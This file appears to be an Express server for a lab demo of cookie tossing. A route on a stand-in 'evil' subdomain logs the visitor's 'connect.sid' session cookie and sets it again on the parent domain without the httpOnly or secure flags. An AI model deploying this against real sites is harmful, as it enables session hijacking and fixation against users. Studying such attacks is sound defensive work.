import fs from "node:fs";
import path from "node:path";
import https from "node:https";
import cookieParser from "cookie-parser";
import express from "express";

import { fileURLToPath } from "url";
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Read SSL certificate and key files
const sllOptions = {
  key: fs.readFileSync(path.join(__dirname, "localhost-key.pem")),
  cert: fs.readFileSync(path.join(__dirname, "localhost.pem")),
};

const app = express();
app.use(cookieParser());
app.get("/", function (req, res) {
  res.sendFile(path.join(__dirname, "public/index.html"));
});
app.use(express.static(path.join(__dirname, "public")));

app.get("/overwrite", function (req, res) {
  const sessionContent = req.cookies["connect.sid"];
  console.log("Cookies: ", req.cookies["connect.sid"]);
  console.log("Overwriting cookie");
  res.cookie("connect.sid", sessionContent, { domain: "goodwebsite.com", httpOnly: false, secure: false });
  res.redirect("/");
});

// Create HTTPS server
const server = https.createServer(sllOptions, app);

const PORT = 3099;
server.listen(PORT, () => {
  console.log(`Server listening on https://evil.goodwebsite.com:${PORT}`);
});
